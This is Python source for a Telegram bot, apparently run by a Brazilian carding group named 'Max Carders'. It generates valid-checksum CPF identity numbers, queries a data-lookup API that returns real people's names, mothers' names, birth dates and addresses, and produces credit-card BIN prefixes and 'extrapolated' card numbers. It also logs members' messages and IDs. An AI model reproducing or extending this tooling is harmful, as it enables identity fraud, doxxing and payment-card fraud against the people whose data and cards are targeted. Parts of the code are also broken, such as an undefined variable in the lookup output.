from importacao import *
def on_callback_query(msg):
	global quantidade_cpf
	global cc2
	global mensagem_enviada
	global id_mensagem_enviada
	global voto_nao
	global voto_sim
	global votos_sim
	global votos_nao
	global second_serie
	arquivo_pergunta = open("pergunta.txt","r")
	pergunta = arquivo_pergunta.read()
	arquivo_pergunta.close()
	c_id = msg["message"]["chat"]["id"]
	m_id = msg["message"]["message_id"]
	data = msg["data"]
	text = msg["message"]["text"]
	if(data=="delete"):
		if(not msg["from"]["id"] == msg["message"]["reply_to_message"]["from"]["id"]):
			bot.answerCallbackQuery(msg["id"], '⚠️ Você não tem permissão para apagar esta mensagem!', show_alert=True)
		else:
			bot.deleteMessage((c_id, m_id))
			bot.deleteMessage((c_id, msg["message"]["reply_to_message"]["message_id"]))
	elif(data == "refresh_cpf"):
		keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='🔄 Atualizar', callback_data="refresh_cpf")], [InlineKeyboardButton(text='🔍 Consultar Todos', callback_data='consultar_cpf')]])
		quantidade = int(msg["message"]["reply_to_message"]["text"].split()[1])
		bot.editMessageText((c_id, m_id), text="<b>Atualizando..</b>", parse_mode="html")
		try:
			quantidade = int(quantidade)
			if(quantidade > 0):
				if(quantidade < 46):
					template = 0
					cpfs_gerados = []
					while(not template == quantidade):
						template += 1
						cpf = f"0{randint(0,9)}{randint(0,9)}{randint(0,9)}{randint(0,9)}{randint(0,9)}{randint(0,9)}{randint(0,9)}{randint(0,9)}"
		
						num1 = int(cpf[0])
						num2 = int(cpf[1])
						num3 = int(cpf[2])
						num4 = int(cpf[3])
						num5 = int(cpf[4])
						num6 = int(cpf[5])
						num7 = int(cpf[6])
						num8 = int(cpf[7])
						num9 = int(cpf[8])
		
						multi1 = 11 - (((num1 * 10) + (num2 * 9) + (num3 * 8) + (num4 * 7) + (num5 * 6) + (num6 * 5) + (num7 * 4) + (num8 * 3) + (num9 * 2)) % 11)
						if(multi1 > 9):
							multi1 = 0
		
						multi2 = 11 - (((num1 * 11) + (num2 * 10) + (num3 * 9) + (num4 * 8) + (num5 * 7) + (num6 * 6) + (num7 * 5) + (num8 * 4) + (num9 * 3) + (multi1 * 2)) % 11)
						if(multi2 > 9):
							multi2 = 0
		
						cpf_novo = f"<b>#{str(template).zfill(len(str(quantidade)))}</b> -> <pre>{cpf}{multi1}{multi2}</pre>"
						cpfs_gerados.append(cpf_novo)
					lista_completa = str(cpfs_gerados).replace("[","").replace("]","").replace("'","").replace(", ","\n")
					bot.editMessageText((c_id, m_id), text=f"<b>RESULTADOS:</b>\n\n{lista_completa}", parse_mode="html", reply_markup=keyboard)
		except:
			pass
	elif(data=="consultar_cpf"):
		if(not msg["from"]["id"] in admins and not msg["from"]["id"] == msg["message"]["reply_to_message"]["from"]["id"]):
			bot.answerCallbackQuery(msg["id"], '⚠️ Você não tem permissão para consultar os CPFs', show_alert=True)
		else:
			cpfs = re.compile("\d{11}").findall(text)
			count = 0
			dados = ""
			for cpf in cpfs:
				count += 1
				api = megadadosCpf(cpf)
				Cpf(cpf)
				if(api["code"] == 200):
					dados = f"""DADOS ENCONTRADOS:
		
NOME:
{api["nome"]}
		
NOME DA MÃE:
{api["nomeMae"]}
		
CPF:
{api["cpf"]}
		
SEXO:
{api["sexo"].title()}
		
DATA DE NASCIMENTO:
{api["nascimento"]}
		
IDADE:
{api["idade"]}
		
ENDEREÇO:
{api["endereco"]}
		
BAIRRO:
{api["bairro"]}
		
CIDADE:
{api["cidade"]}
		
CEP:
{api["cep"]}
		
#@MaxCardersBot\n"""
					dados += "<b>"+str(count).zfill(len(str(len(cpfs))))+" -> </b>"+pastebin(dado)+"\n"
				else:
					dados += "<b>"+str(count).zfill(len(str(len(cpfs))))+" -> CPF não encontrado!</b>\n"
				bot.editMessageText((c_id, m_id), text=dados, parse_mode="html")
	elif(data=="chkgen"):
		if(not msg["from"]["id"] in admins and not msg["from"]["id"] == msg["message"]["reply_to_message"]["from"]["id"]):
			bot.answerCallbackQuery(msg["id"], '⚠️ Você não tem permissão para apagar esta mensagem!', show_alert=True)
		else:	
			bot.deleteMessage((c_id, m_id))
			try:
				bot.deleteMessage((c_id, msg["message"]["reply_to_message"]["message_id"]))
			except:
				pass
	
	#PAGINA 2
	elif(data=="comandos_proximo"):
		keyboard = InlineKeyboardMarkup(
			inline_keyboard=[
				[InlineKeyboardButton(text='➡️️ Próxima Página', callback_data='comandos_proximo2')],
				[InlineKeyboardButton(text='⬅️ Página Anterior', callback_data='comandos_anterior2')]
			]
		)
		bot.editMessageText((c_id, m_id), text=comandos_pagina2, parse_mode="html", reply_markup=keyboard)
	
	
	#PAGINA 1
	if(data=="comandos_anterior2"):
		keyboard = InlineKeyboardMarkup(
			inline_keyboard=[
				[InlineKeyboardButton(text='➡️ Próxima Página', callback_data='comandos_proximo')]
			]
		)
		bot.editMessageText((c_id, m_id), comandos_pagina1, parse_mode="html", reply_markup=keyboard)





	#PAGINA 3
	if(data=="comandos_proximo2"):
		keyboard = InlineKeyboardMarkup(
			inline_keyboard=[
				[InlineKeyboardButton(text='➡️ Próxima Página', callback_data='comandos_proximo3')],
				[InlineKeyboardButton(text='⬅️ Página Anterior', callback_data="comandos_proximo")]
			]
		)
		bot.editMessageText((c_id, m_id), comandos_pagina3, parse_mode="html", reply_markup=keyboard)
	
	
	
	
	#PAGINA 4
	if(data=="comandos_proximo3"):
		keyboard = InlineKeyboardMarkup(
			inline_keyboard=[
				[InlineKeyboardButton(text='➡️ Próxima Página', callback_data='comandos_proximo4')],
				[InlineKeyboardButton(text='⬅️ Página Anterior', callback_data='comandos_anterior4')]
			]
		)
		bot.editMessageText((c_id, m_id), comandos_pagina4, parse_mode="html", reply_markup=keyboard)
	
	#PAGINA 4
	if(data=="comandos_anterior5"):
		keyboard = InlineKeyboardMarkup(
			inline_keyboard=
				[
					[InlineKeyboardButton(text='➡️ Próxima Página', callback_data='comandos_proximo4')],
					[InlineKeyboardButton(text='⬅️ Página Anterior', callback_data='comandos_anterior4')]
				]
			)
		bot.editMessageText((c_id, m_id), comandos_pagina4, parse_mode="html", reply_markup=keyboard)
	
	
	
	#PAGINA 5
	if(data=="comandos_proximo4"):
		keyboard = InlineKeyboardMarkup(
			inline_keyboard=[
				[InlineKeyboardButton(text='⬅️ Página Anterior', callback_data='comandos_anterior5')]
			]
		)
		bot.editMessageText((c_id, m_id), comandos_pagina5, parse_mode="html", reply_markup=keyboard)
	
	
	
	if(data=="comandos_anterior4"):
		keyboard = InlineKeyboardMarkup(
			inline_keyboard=[
				[InlineKeyboardButton(text='➡️ Próxima Página', callback_data='comandos_proximo3')],
				[InlineKeyboardButton(text='⬅️ Página Anterior', callback_data='comandos_proximo')]
			]
		)
		bot.editMessageText((c_id, m_id), comandos_pagina3, parse_mode="html", reply_markup=keyboard)


	if(data=="extrap"):
		bin = msg["message"]["reply_to_message"]["text"].split()[1][:6]
		def numGen(quantidade):
			numeros = ""
			nums = list("x0x1x2x3x4x5x6x7x8x9")
			for x in range(0, quantidade):
				numeros += str(choice(nums))
			return numeros
		keyboard = InlineKeyboardMarkup(
			inline_keyboard=[
				[InlineKeyboardButton(text=f"🔄 Atualizar", callback_data="extrap")]
			]
		)
		
		bot.editMessageText((c_id, m_id), text=f"<b>EXTRAPOLAÇÕES:</b>\n\n<pre>{bin}{numGen(10)}</pre>\n<pre>{bin}{numGen(10)}</pre>\n<pre>{bin}{numGen(10)}</pre>\n<pre>{bin}{numGen(10)}</pre>\n<pre>{bin}{numGen(10)}</pre>\n<pre>{bin}{numGen(10)}</pre>\n<pre>{bin}{numGen(10)}</pre>", parse_mode="html", reply_markup=keyboard)








	if(data=="pergunta_sim"):
		try:
			del voto_nao[msg["from"]["id"]]
			votos_nao -= 1
		except:
			pass
		voto_sim[msg["from"]["id"]] = "SIM"
		votos_sim = len(voto_sim)
		keyboard = InlineKeyboardMarkup(
			inline_keyboard=[
				[InlineKeyboardButton(text='Sim', callback_data='pergunta_sim')],
				[InlineKeyboardButton(text='Não', callback_data='pergunta_nao')]
			]
		)
		if(pergunta[-1] != "?"):
			pergunta += "?"
		try:
			bot.editMessageText((c_id, m_id), f"<b>PERGUNTA:</b>\n<pre>{pergunta}</pre>\n\n<b>SIM: {votos_sim}\nNÃO: {votos_nao}</b>", "html", reply_markup=keyboard)
		except:
			bot.answerCallbackQuery(msg["id"], '⚠️Você pode votar apenas uma vez no botão "Sim"!', show_alert=True)
	if(data=="pergunta_nao"):
		try:
			del voto_sim[msg["from"]["id"]]
			votos_sim -= 1
		except:
			pass
		voto_nao[msg["from"]["id"]] = "NÃO"
		votos_nao = len(voto_nao)
		keyboard = InlineKeyboardMarkup(
			inline_keyboard=[
				[InlineKeyboardButton(text='Sim', callback_data='pergunta_sim')],
				[InlineKeyboardButton(text='Não', callback_data='pergunta_nao')]
			]
		)
		if(pergunta[-1] != "?"):
			pergunta += "?"
		try:
			bot.editMessageText((c_id, m_id), f"<b>PERGUNTA:</b>\n<pre>{pergunta}</pre>\n\n<b>SIM: {votos_sim}\nNÃO: {votos_nao}</b>", "html", reply_markup=keyboard)
		except:
			bot.answerCallbackQuery(msg["id"], '⚠️Você pode votar apenas uma vez no botão "Não"!', show_alert=True)
	
	if(data=="try_ping"):
		keyboard2 = InlineKeyboardMarkup(
			inline_keyboard=[
				[InlineKeyboardButton(text='Ver Novamente', callback_data='try_ping')]
			]
		)
		first = time()
		bot.editMessageText((c_id, m_id), text="<b>Capturando tempo de resposta novamente, por favor aguarde..</b>", parse_mode="html")
		second = time()
		ms = str(second-first)[:5]
		bot.editMessageText((c_id, m_id), text=f"<b>Tempo de resposta.. {ms} ms!</b>", parse_mode="html", reply_markup=keyboard2)
	if(data=="alert1"):
		bot.answerCallbackQuery(c_id, 'Teste De Mensagem De Aviso 1')
	if(data=="alert2"):
		bot.answerCallbackQuery(c_id, 'Teste De Mensagem De Aviso 2', show_alert=True)
	
	if(data == "update_nickgen"):
		nick = msg["message"]["reply_to_message"]["text"][9:]
		keyboard = InlineKeyboardMarkup(
			inline_keyboard=[
				[InlineKeyboardButton(text=f"🔄 Atualizar", callback_data="update_nickgen")]
			]
		)
		nicks = f"""<b>01#</b> -> <pre>{gerarNick(nick)}</pre>
<b>02#</b> -> <pre>{gerarNick(nick)}</pre>
<b>03#</b> -> <pre>{gerarNick(nick)}</pre>
<b>04#</b> -> <pre>{gerarNick(nick)}</pre>
<b>05#</b> -> <pre>{gerarNick(nick)}</pre>
<b>06#</b> -> <pre>{gerarNick(nick)}</pre>
<b>07#</b> -> <pre>{gerarNick(nick)}</pre>
<b>08#</b> -> <pre>{gerarNick(nick)}</pre>
<b>09#</b> -> <pre>{gerarNick(nick)}</pre>
<b>10#</b> -> <pre>{gerarNick(nick)}</pre>
<b>11#</b> -> <pre>{gerarNick(nick)}</pre>
<b>12#</b> -> <pre>{gerarNick(nick)}</pre>
<b>13#</b> -> <pre>{gerarNick(nick)}</pre>
<b>14#</b> -> <pre>{gerarNick(nick)}</pre>
<b>15#</b> -> <pre>{gerarNick(nick)}</pre>"""
		bot.editMessageText((c_id, m_id), text=f"<b>NICKS GERADOS:</b>\n\n{nicks}", parse_mode="html", reply_markup=keyboard)
	
	if(data == "update_bingen"):
		try:
			quantidade = int(msg["message"]["reply_to_message"]["text"].split()[1])
			if(quantidade > 45):
				bot.sendMessage(msg["chat"]["id"], "<b>Insira uma quantidade menor. O maximo é de 45 para não ter flood.</b>", "html", reply_to_message_id = msg["message_id"])
			else:
				try:
					bins = ""
					for x in range(0, quantidade):
						def gen(q):
							nums = ""
							for c in range(0, int(q)):
								nums += str(randint(0, 9))
							return nums
						mastercard = ["51", "52", "53", "54", "55"]
						visa = ["4"]
						dinners_club = ["36", "38"]
						jcb = ["35"]
						discover = ["6011", "65"]
						amex = ["34", "37"]
						nomes = ["mastercard", "visa", "dinners_club", "jcb", "discover", "amex"]
						bandeira = choice(nomes)
						if(bandeira == "mastercard"):
							bin = f"{choice(mastercard)}{gen(4)}"
						if(bandeira == "visa"):
							bin = f"{choice(visa)}{gen(5)}"
						if(bandeira == "dinners_club"):
							bin = f"{choice(dinners_club)}{gen(4)}"
						if(bandeira == "jcb"):
							bin = f"35{gen(4)}"
						if(bandeira == "discover"):
							if(len(choice(discover)) == 4):
								bin = f"6011{gen(2)}"
							else:
								bin = f"65{gen(4)}"
						if(bandeira == "amex"):
							bin = f"{choice(amex)}{gen(4)}"
		
						bins += f"<pre>{bin}</pre> -> <b>{bandeira.upper().replace('_', ' ')}</b>\n"
					keyboard = InlineKeyboardMarkup(
						inline_keyboard=[
							[InlineKeyboardButton(text=f"🔄 Atualizar", callback_data="update_bingen")]
						]
					)
					bot.editMessageText((c_id, m_id), text=f'<b>RESULTADO:</b>\n\n{bins}\n<b>NOTA: Consulte a bin para verifica-la e utiliza-la.</b>', parse_mode="html", reply_markup=keyboard)
				except KeyboardInterrupt:
					bot.editMessageText((c_id, m_id), text="<b>Tente inserir uma quantidade menor.</b>", parse_mode="html")
		except KeyboardInterrupt:
			bot.editMessageText((c_id, m_id), text="<b>Quantidade inválida, certifique-se de que isso seja é realmente um numero.</b>", parse_mode="html")
	
	if(data=="atualizar_admins"):
		bot.editMessageText((c_id, m_id), text="<b>Obtendo lista de admins novamente, por favor aguarde..</b>", parse_mode="html")
		admins_list = bot.getChatAdministrators(c_id)
		todos_admins = ""
		count_admins = 0
		keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='🔄 Atualizar Lista', callback_data='atualizar_admins')]])
		for x in admins_list:
			count_admins += 1
			status = x["status"]
			try:
				segundo_nome = f'<pre>{x["user"]["last_name"]}</pre>'
			except:
				segundo_nome = ""
		
			try:
				username = "@"+x["user"]["username"]
			except:
				username = "Sem nome de usuário"
		
			if(status == "administrator"):
				status = "🏅 ADMIN"
			else:
				status = "🥇 CRIADOR"
		
			if(username != "Sem nome de usuário"):
				if(x["user"]["username"] in ["Jhow_silva", "Leomaldonado"]):
					status = "🏅 ADMIN, FORNECEDOR"
			
		
			todos_admins += f'<b>{str(count_admins).zfill(2)}# {status}\nNOME:</b> <pre>{x["user"]["first_name"]}</pre> {segundo_nome}\n<b>USUÁRIO:</b> {username}\n\n'
		bot.editMessageText((c_id, m_id), text=todos_admins, parse_mode="html", reply_markup=keyboard)

def main_thread(*args, **kwargs):
	t = threading.Thread(target=main, args=args, kwargs=kwargs)
	t.daemon = True
	t.start()

def callback_thread(*args, **kwargs):
	t = threading.Thread(target=on_callback_query, args=args, kwargs=kwargs)
	t.daemon = True
	t.start()


def exec_thread(target, *args, **kwargs):
	t = threading.Thread(target=target, args=args, kwargs=kwargs)
	t.daemon = True
	t.start()

def main(msg):
	if("text" in msg):
		if(msg["text"][0] == "/"):
			bot.sendChatAction(msg['chat']['id'], 'typing')
	global mensagem_enviada
	global id_mensagem_enviada
	global btn_sim
	global btn_nao
	global pergunta
	global second_serie
	global sessao
	global admins
	try:
		for adms in bot.getChatAdministrators(msg["chat"]["id"]):
			admins.append(adms["user"]["id"])
	except:
		pass
	try:
		id_mensagem_enviada = msg["message_id"]
	except:
		pass
	try:
		mensagem_enviada = msg["text"]
	except:
		pass
	global quantidade_cpf
	global verify_members
	global ativar
	global mensagens_count
	try:
		usuario = msg['from']['username']
	except:
		usuario = "SEM_USUARIO"
	global deram_start
	global quem
	global membros
	try:
		membros[usuario] = msg["from"]["id"]
	except:
		pass
	backup_membros = open("backup_members.txt", "w")
	backup_membros.write(f"{membros}")
	backup_membros.close()
	mensagens_count += 1
	
	for adms in admins:
		sessao[adms] = 0
		arquivo = open("sessoes.txt","w")
		arquivo.write(str(sessao))
		arquivo.close()
	
	try:
		if(msg["chat"]["type"] == "supergroup" and msg["chat"]["id"] == -1001369566461 or msg["chat"]["type"] == "supergroup" and msg["chat"]["id"] == msg["chat"]["id"]):
			sobrenome_mensagem_print = ""
			try:	
				sobrenome_mensagem_print = msg['from']['last_name']
				if(sobrenome_mensagem_print == ""):
					sobrenome_mensagem_print = "NENHUM"
			except:
				sobrenome_mensagem_print = "NENHUM"
		
			is_bot_mensagem_print = msg["from"]["is_bot"]
			if(is_bot_mensagem_print == False):
				is_bot_mensagem_print = "NÃO"
			else:
				is_bot_mensagem_print = "SIM"
		
			dados_mensagem_grupo_print = f"""\033[0;32m==============================================
[!]TIPO DE CHAT: SUPER GRUPO
[!]TITULO DO GRUPO: {msg['chat']['title']}
[!]ID DO USUARIO: {msg['from']['id']}
[!]CHAT ID: {msg['chat']['id']}
[!]NOME: {msg['from']['first_name']}
[!]SOBRENOME: {sobrenome_mensagem_print}
[!]USUÁRIO: {usuario}
[!]MENSAGEM ID: {msg['message_id']}
[!]É BOT? {is_bot_mensagem_print}
[!]HORAS: {str(localtime()[3]).zfill(2)}h{localtime()[4]}m{str(localtime()[5]).zfill(2)}
[!]DATA: {str(localtime()[2]).zfill(2)}/{str(localtime()[1]).zfill(2)}/{localtime()[0]}
[!]POSIÇÃO: {mensagens_count}
[!]MENSAGEM: {msg['text']}"""
			print(dados_mensagem_grupo_print)
		else:
			sobrenome_mensagem_print = ""
			try:	
				sobrenome_mensagem_print = msg['from']['last_name']
				if(sobrenome_mensagem_print == ""):
					sobrenome_mensagem_print = "NENHUM"
			except:
				sobrenome_mensagem_print = "NENHUM"
			
			is_bot_mensagem_print = msg["from"]["is_bot"]
			if(is_bot_mensagem_print == False):
				is_bot_mensagem_print = "NÃO"
			else:
				is_bot_mensagem_print = "SIM"
			dados_mensagem_privado_print = f"""\033[0;32m==============================================
[!]TIPO DE CHAT: PRIVADO
[!]ID DO USUARIO: {msg['from']['id']}
[!]NOME: {msg['from']['first_name']}
[!]CHAT ID: {msg['chat']['id']}
[!]SOBRENOME: {sobrenome_mensagem_print}
[!]USUÁRIO: {usuario}
[!]MENSAGEM ID: {msg['message_id']}
[!]É BOT? {is_bot_mensagem_print}
[!]HORAS: {str(localtime()[3]).zfill(2)}h{localtime()[4]}m{str(localtime()[5]).zfill(2)}
[!]DATA: {str(localtime()[2]).zfill(2)}/{str(localtime()[1]).zfill(2)}/{localtime()[0]}
[!]POSIÇÃO: {mensagens_count}
[!]MENSAGEM: {msg['text']}"""
			print(dados_mensagem_privado_print)
	except KeyError:
		mensagens_count -= 1
		print("""\033[0;31m==============================================
[!]NÃO É TEXTO...\033[m""")
	
	try:
		welcome = f"""
<b>🇧🇷 Max Carders 

{html.escape(msg['new_chat_participant']['first_name'])}, Seja bem vindo(a) a nossa comunidade onde você pode aderir e compartilhar conhecimentos um com os outros.

- O grupo possui um bot onde você pode realizar comandos e resolver coisas com mais facilidades.
Dê um</b> /regras <b>para exibir as regras do grupo ou um</b> /comandos <b>para exibir os comandos e os status deles.

* Conheça Também Os Nossos Canais No Telegram.</b>

<b>Ver se você foi reportado ou não:</b>
http://t.me/BrazilReports

<b>Comunidade:</b>
http://t.me/MaxCarders"""

	except:
		pass
	
	
	g = telepot.glance(msg)
	try:
		if(g[0] == 'new_chat_member' and msg["new_chat_participant"]["first_name"] == "FirstCatMS"):
			keyboard = InlineKeyboardMarkup(inline_keyboard=[
				[InlineKeyboardButton(text='✈️ TELEGRAM', callback_data='welcome_telegram', url="t.me/TioFlaviin")]
				])

			welcome_me = f"""<b>OPA, SOU BEM VINDO AQUI?...CONFIRA MINHAS FORMAS DE CONTATO:</b>"""
			bot.sendMessage(msg["chat"]["id"], welcome_me, "html", reply_markup=keyboard)
			try:
				if(msg["new_chat_member"]["from"]["username"]):
					pass
				else:
					bot.sendDocument(msg["chat"]["id"], "http://makerscriiptsbr.ml/tutorial.mp4")
			except:
				bot.sendDocument(msg["chat"]["id"], "http://makerscriiptsbr.ml/tutorial.mp4")
		elif(g[0] == "left_chat_member"):
			bot.sendMessage(msg["chat"]["id"], f"<b>@{html.escape(msg['left_chat_member']['first_name'])}, OBRIGADO PELA PARTICIPAÇÃO.</b>", "html")
		else:
			keyboard = InlineKeyboardMarkup(inline_keyboard=[
				[InlineKeyboardButton(text='✈️ Telegram', callback_data='welcome_facebook', url="t.me/TioFlaviin")],
			])
			wlcm = bot.sendMessage(msg["chat"]["id"], welcome, "html", reply_to_message_id = msg["message_id"], reply_markup=keyboard, disable_web_page_preview=True)
	except:
		pass	

	
	try:
		if(msg["text"].upper() == "WTF"):
			bot.sendDocument(msg["chat"]["id"], document=open("quepohaesssa.mp4", "rb"), reply_to_message_id=msg["message_id"])
	except:
		pass
	
	
	
	try:
		if(msg["reply_to_message"]["from"]["id"] == 684842099 and not msg["text"][0] == "/" and not msg["text"][0] == "!"):
			bot.sendChatAction(msg['chat']['id'], 'typing')
			url = "http://tabuadafree.000webhostapp.com/api_robo.php"
			params = {"msg":msg["text"]}
			r = requests.get(url, params=params).text
			bot.sendMessage(msg["chat"]["id"], r, "html", reply_to_message_id = msg["message_id"])
	except:
		pass
	
	
	
	

	#comandos admins
	try:
		if(msg["text"].upper() == "!ATIVARBOT" and msg["from"]["id"] in admins):
			if(ativar == True):
				bot.sendMessage("@MaxCarders", f"<b>@{usuario} O BOT JÁ ESTÁ ATIVADO!</b>", "html")	
			else:
				ativar = True
				bot.sendMessage("@MaxCarders", f"<b>@{usuario} ATIVOU O BOT!</b>", "html")
				quem = ""
		elif(msg["text"].split()[0].upper() == "!PERGUNTA" and msg["from"]["id"] in admins):
			pergunta = msg["text"][10:]
			arquivo_pergunta = open("pergunta.txt","w")
			arquivo_pergunta.write(pergunta)
			arquivo_pergunta.close()
			keyboard = InlineKeyboardMarkup(
				inline_keyboard=[
					[InlineKeyboardButton(text='Sim', callback_data='pergunta_sim')],
					[InlineKeyboardButton(text='Não', callback_data='pergunta_nao')],
				]
			)
			bot.sendMessage("@MaxCarders", f"<b>PERGUNTA:</b>\n<pre>{pergunta}</pre>\n\n<b>SIM: 0\nNÃO: 0</b>", "html", reply_to_message_id = msg["message_id"], reply_markup=keyboard)
			
		elif(msg["text"].upper() == "!APPEND" and msg["from"]["username"] == "TioFlaviin"):
			usuario = msg["reply_to_message"]["from"]["username"]
			super.append(usuario)
		elif(msg["text"].upper() == "!RM" and msg["from"]["username"] == "TioFlaviin"):
			usuario = msg["reply_to_message"]["from"]["username"]
			super.remove(usuario)
		elif(msg["text"].split()[0].upper() == "!ASSUNTO" and msg["from"]["id"] in admins):
			foto = msg["text"].split()[1]
			mensagem = msg["text"][len(msg["text"].split()[0]) + len(msg["text"].split()[1]) + 2:]
			if(foto.find("youtu.be") == 1):
				foto = foto[-10:]
			else:	
				foto = foto[-11:]
			hd = f"https://i.ytimg.com/vi/{foto}/maxresdefault.jpg"
			hq = f"https://i.ytimg.com/vi/{foto}/hqdefault.jpg"
			try:
				bot.sendPhoto("@MaxCarders", photo=hd, caption=mensagem, parse_mode="html")
			except:
				bot.sendPhoto("@MaxCarders", photo=hq, caption=mensagem, parse_mode="html")
		elif(msg["text"].upper() == "!ADDSESSAO" and msg["from"]["username"] in super):
			usuario_sessao = msg["reply_to_message"]["from"]["id"]
			sessao[usuario_sessao] = 0
			arquivo = open("sessoes.txt","w")
			arquivo.write(str(sessao))
			arquivo.close()
		elif(msg["text"].upper() == "!RMSESSAO" and msg["from"]["username"] in super):
			try:
				remove_sessao = msg["reply_to_message"]["from"]["id"]
				del sessao[remove_sessao]
				arquivo = open("sessoes.txt","w")
				arquivo.write(str(sessao))
				arquivo.close()
			except:
				pass
		elif(msg["text"].split()[0].upper() == "!SK" and msg["from"]["id"] in admins and msg["from"]["id"] in super):
			membro_kickado = msg["reply_to_message"]["from"]["id"]
			sim_nao = ["SIM","NÃO"]
			sim_nao_sorteada = choice(sim_nao)
			if(sim_nao_sorteada == "SIM"):
				bot.sendMessage("@MaxCarders", f"<b>⚠️SORTEEI UMA RESPOSTA PRO ALVO:</b>\n<pre>{html.escape(msg['reply_to_message']['from']['first_name'])}</pre>\n\n<b>➡️ SE ESSE ALVO SERÁ KICKADO OU NÃO.\n\n❇️MINHA RESPOSTA:</b> <pre>{sim_nao_sorteada}</pre>\n\n<b>ISSO SIGNIFICA QUE:</b>\n<pre>O ALVO SERÁ KICKADO✅</pre>", "html", reply_to_message_id = msg["message_id"])
				bot.sendMessage("@MaxCarders", f"<b>ADEUS</b> <pre>{html.escape(msg['reply_to_message']['from']['first_name'])}</pre><b>.</b>", "html")
				bot.sendMessage("@MaxCarders", "<b>VÁ EM PAZ!</b>", "html")
				bot.unbanChatMember("@MaxCarders", msg["reply_to_message"]["from"]["id"])
			else:
				bot.sendMessage("@MaxCarders", f"<b>⚠️SORTEEI UMA RESPOSTA PRO ALVO:</b>\n<pre>{html.escape(msg['reply_to_message']['from']['first_name'])}</pre>\n\n<b>➡️ SE ESSE ALVO SERÁ KICKADO OU NÃO.\n\n❇️MINHA RESPOSTA:</b> <pre>{sim_nao_sorteada}</pre>\n\n<b>ISSO SIGNIFICA QUE:</b>\n<pre>O ALVO NÃO SERÁ KICKADO❌</pre>", "html", reply_to_message_id = msg["message_id"])
		elif(msg["text"].split()[0].upper() == "!MUTE" and msg["from"]["id"] in admins):
			try:
				membro_mutado = msg["reply_to_message"]["from"]["id"]
			except:
				membro_mutado = msg["text"].split()[1]
				if(membro_mutado[0] == "@"):
					membro_mutado = membro_mutado[1:]
			bot.restrictChatMember("@MaxCarders", membro_mutado, until_date=1, can_send_messages=False, can_send_media_messages=False, can_send_or_messages=False, can_add_web_page_previews=False)
		elif(msg["text"].split()[0].upper() == "!DEMUTE" and msg["from"]["id"] in admins):
			membro_mutado = msg["reply_to_message"]["from"]["id"]
			bot.restrictChatMember("@MaxCarders", membro_mutado, until_date=1, can_send_messages=True, can_send_media_messages=True, can_send_or_messages=True, can_add_web_page_previews=True)
		elif(msg["text"].split()[0].upper() == "!ATIVARBOT" and msg["text"].split()[1].upper() == "PRIVADO" and msg["from"]["id"] in admins):
			if(ativar == True):
				bot.sendMessage(msg["chat"]["id"], f"<b>O BOT JÁ ESTÁ ATIVADO!</b>", "html")
				ativar = True
			else:	
				ativar = True
				bot.sendMessage(msg["chat"]["id"], "<b>BOT ATIVADO!</b>", "html")
				quem = ""
		elif(msg["text"].upper() == "!DESATIVARBOT" and msg["from"]["id"] in admins):
			if(ativar == False):
				bot.sendMessage(msg["chat"]["id"], f"<b>@{usuario} O BOT JÁ ESTÁ DESATIVADO!</b>", "html")
				ativar = False
			else:
				ativar = False
				bot.sendMessage(msg["chat"]["id"], f"<b>@{usuario} DESATIVOU O BOT!</b>", "html")
				quem = usuario
		elif(msg["text"].split()[0].upper() == "/CHKCPF" and msg["text"].split()[1]):
			cpfs = ""
			count_chkcpf = 0
			todos_cpfs = msg["text"][8:].split("\n")
			for send_status in todos_cpfs:
				if(send_status.replace(" ", "") != ""):
					try:
						count_chkcpf += 1
						send_status = send_status.replace(".", "").replace("-", "").replace("|", "").replace(" ","")
						numero_cpf = send_status[0:9]
						digito_verificador = send_status[9:11]
						n1 = int(str(numero_cpf)[0])
						n2 = int(str(numero_cpf)[1])
						n3 = int(str(numero_cpf)[2])
						n4 = int(str(numero_cpf)[3])
						n5 = int(str(numero_cpf)[4])
						n6 = int(str(numero_cpf)[5])
						n7 = int(str(numero_cpf)[6])
						n8 = int(str(numero_cpf)[7])
						n9 = int(str(numero_cpf)[8])
				
						multi1 = 11 - (((n1 * 10) + (n2 * 9) + (n3 * 8) + (n4 * 7) + (n5 * 6) + (n6 * 5) + (n7 * 4) + (n8 * 3) + (n9 * 2))%11)
						if(multi1 > 9):
							multi1 = 0	
						multi2 = 11 - (((n1 * 11) + (n2 * 10) + (n3 * 9) + (n4 * 8) + (n5 * 7) + (n6 * 6) + (n7 * 5) + (n8 * 4) + (n9 * 3) + (multi1 * 2))%11)
						if(multi2 > 9):
							multi2 = 0
						novos_dv = f"{multi1}{multi2}"
						if(novos_dv == digito_verificador):
							cpfs += f"<pre>[{count_chkcpf}/{len(todos_cpfs)}]{send_status}</pre>\n<b>✅CPF VÁLIDO!</b>\n\n"
						else:
							cpfs += f"<pre>[{count_chkcpf}/{len(todos_cpfs)}]{send_status}</pre>\n<b>❌CPF INVÁLIDO\nCORRIGINDO:</b> <pre>{numero_cpf}-{novos_dv}</pre>\n\n"
					except:
						cpfs += f"<pre>[{count_chkcpf}/{len(todos_cpfs)}]{send_status}</pre>\n<b>❌CPF DESCONHECIDO!</b>\n\n"
				else:
					count_chkcpf += 1
			bot.sendMessage(msg["chat"]["id"], cpfs, "html", reply_to_message_id = msg["message_id"])
		elif(msg["text"].split()[0].upper() == "!DESATIVARBOT" and msg["text"].split()[1].upper() == "PRIVADO" and msg["from"]["id"] in admins):
			if(ativar == False):
				bot.sendMessage(msg["chat"]["id"], f"<b>O BOT JÁ ESTÁ DESATIVADO!</b>", "html", reply_to_message_id = msg["message_id"])
				ativar = False
			else:
				bot.sendMessage(msg["chat"]["id"], "<b>BOT DESATIVADO!</b>", "html", reply_to_message_id = msg["message_id"])
				ativar = False
				quem = ""
		elif(msg["text"].split()[0].upper() == "!IMG" and msg["text"].split()[1]):
			url_image = msg["text"].split()[1]
			bot.sendPhoto(msg["chat"]["id"], url_image)
		elif(msg["text"].split()[0].upper() == "!MSG" and (msg["from"]["id"] in super or msg["from"]["id"] in admins) and msg["text"].split()[1]):
			tipo = msg["text"].split()[1]
			mensagem = msg["text"][len(msg["text"].split()[0]) + len(msg["text"].split()[1]) + 2:]
			if(tipo[0] == "_"):
				mensagem = f"<i>{mensagem}</i>"
			elif(tipo[0] == "*"):
				mensagem = f"<b>{mensagem}</b>"
			elif(tipo[0] == "`"):
				mensagem = f"<pre>{mensagem}</pre>"
			elif(tipo.upper().find("HTTP") == 0 or tipo.upper().find("WWW") == 0 or tipo.upper().count("COM") > 0):	
				mensagem = f"<a href='{tipo}'>{mensagem}</a>"
